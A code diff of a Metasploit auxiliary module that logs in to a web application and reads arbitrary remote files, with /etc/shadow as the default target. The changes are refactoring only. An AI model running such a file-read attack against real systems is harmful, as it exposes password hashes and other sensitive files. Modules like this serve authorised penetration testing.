@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'json'
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
@@ -33,7 +31,6 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(80),
         OptString.new('FILE', [ true,  'Remote file to view', '/etc/shadow']),
         OptString.new('TARGETURI', [true, 'Vulnerable URI path', '/']),
         OptString.new('USERNAME', [true, 'Username', 'admin']),
@@ -42,7 +39,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     # pull our csrf
     res = send_request_cgi({
       'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),
@@ -66,7 +62,6 @@ class MetasploitModule < Msf::Auxiliary
       'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),
       'method' => 'POST',
       'cookie' => cookie,
-      'ctype' => 'application/x-www-form-urlencoded;',
       'vars_post' => {
         'csrfmiddlewaretoken' => csrf,
         '_fields' => JSON.generate({
@@ -108,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res && res.body
-      result = JSON.parse(res.body)
+      result = res.get_json_document
       unless result.has_key?('web3.model')
         print_error('Invalid JSON returned')
         return
@@ -118,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
       # the file name.  It also, by default, includes other files, so we need to check we're on the right file.
       result['web3.model']['messages']['rows'].each do |row|
         if row['msg'].start_with?(datastore['FILE'])
-          reconstructed_file << row['msg'].gsub("#{datastore['FILE']}:",'').strip()
+          reconstructed_file << row['msg'].gsub("#{datastore['FILE']}:",'').strip
         end
       end
       if reconstructed_file.any?
@@ -131,4 +126,5 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
+
 end
